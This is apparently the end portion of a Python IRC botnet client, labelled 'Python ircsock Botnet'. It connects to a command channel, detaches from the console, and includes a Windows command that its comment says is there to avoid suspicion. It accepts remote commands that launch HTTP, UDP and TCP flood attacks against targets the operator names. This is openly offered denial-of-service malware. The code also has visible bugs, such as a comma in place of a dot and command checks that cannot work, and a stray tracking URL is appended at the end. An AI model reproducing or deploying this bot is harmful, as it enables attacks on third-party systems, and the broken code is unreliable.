                ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                default = ssl.create_default_context()
                ircsock.connect((server, 6697))
                ircsock = default.wrap_socket(default, server_hostname=server)
                connected = 1
                break
            except Exception as e:
                print (e.stacktrace())
                continue
                
        while connected:
            try:
                print("[.] starting secondary connect apex")
                ircsock.send(bytes(f"USER {botnick} {botnick} {botnick} :Python ircsock Botnet\n", "UTF-8"))
                ircsock.send(bytes(f"NICK {botnick}\n", "UTF-8"))
                cmd = ircsock,recv(102400)
                # Connect first, then Join the channel
                print("[,] Joining {channel}")
                ircsock.send(bytes(f"JOIN {channel} {key}\n", "UTF-8"))
                print(ircsock.recv(8912))
                try:
                    if os.name == "linux":
                        print("successful send join. forking....")
                        os.fork() # Linux fork() out of console
                    if os.name == "nt" and not silentmode:
                        os.popen("rundll32.exe 3") # Open browser windows most default way; that way nothing will seem suspicous. Once we connect we'll start parsing commands ASAP
                except:
                    pass
                
                # Main loop to listen for messages
                while True:
                    response = ircsock.recv(2048).decode("UTF-8")
                    if response.startswith("PING") or "PRIVMSG" in response:
                        if response.startswith("PING") and not connected:
                            ircsock.send(bytes(f"PONG {response.split()[1]}\n", "UTF-8"))
                            ircsock.send(bytes(f"JOIN {channel} {key}\n", "UTF-8"))
                            print("joint channel on my end... check other if issues is.")
                            connected = 1
                        if not connected:
                            continue
                    if "PRIVMSG" in response:
                        username = response.split('!', 1)[0][1:]
                        message = response.split('PRIVMSG', 1)[1].split(':', 1)[1]
                        print(f"{username}: {message}")
                        if message.strip() == "!reset":
                            break
                        elif message[0] == "!hello":
                            send_message(f"Hello, {username}!")
                        elif message[0] == "!hostlink":
                            send_message(f"Hello, {username} my host-link is {hostlink}")
                            print(os.get_terminal_size(os.fdopen(0)))
                        elif message[0] == "!httpflood":
                            send_message(f"HTTP(s) Attacking {message[1]} , {username}!")
                            endtime = time.clock() + int(message[2])
                            threading.Thread(target = httpflood, args=(message[1], int(message[2]))).start()
                        elif message[0] == "!udp":
                            message = message.split(" ")
                            target = message[1]
                            port = message[2]
                            time = int(message[3])
                            send_message(f"UDP Attacking , {username}!")
                            threading.Thread(target=(udp), args=(target,port,int(message[3]))).start()
                        elif message[0] == "!tcp":
                            message = message.split(" ")
                            target = message[1]
                            port = message[2]
                            packetsize = message[3]
                            time = int(message[4])
                            send_message(f"UDP Attacking , {username}!")
                            threading.Thread(target=(tcp), args=(target,port,int(message[3]))).start()
                sys._exit()
            except Exception as e:
                print(str(e))
                pass

serverstart()
# https://notifications.google.com/g/lp/ANiao5q8lMseO2baicLVBQdbxChXu7kZK7g0LfP_LO7l7KtC9abPSxgIW14javwOD3ONTkFgHRNXUvM6o1i-VjZ2hwPlWgINoeloFlVBcS_eiCR1BOEhVfPjQ4u7klOUtAfm4Oapqe1rcvs2cinFThTwV0g?tb=CAMP-20181297_MSG-110605758_CHAN-Email_DATE-20250311_LANG-En_GEO-Ca_MOD-Hats_SLOT-Yes
